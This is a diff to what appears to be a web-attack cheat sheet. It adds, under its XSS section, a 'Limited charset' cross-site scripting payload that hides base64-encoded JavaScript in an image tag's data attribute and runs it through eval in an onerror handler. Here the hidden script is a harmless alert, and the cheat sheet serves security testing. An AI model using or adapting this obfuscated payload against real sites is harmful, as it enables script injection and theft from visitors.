@@ -69,6 +69,12 @@ MySQL >=5.6
 
 ### XSS
 
+Limited charset
+
+```
+< ="<img src data-x=YWxlcnQoZG9jdW1lbnQubG9jYXRpb24p onerror=javascript:eval(atob(this.dataset.x)) />
+```
+
 #### CSS Injection
 
 Abuse unicode range to exfiltrate charset
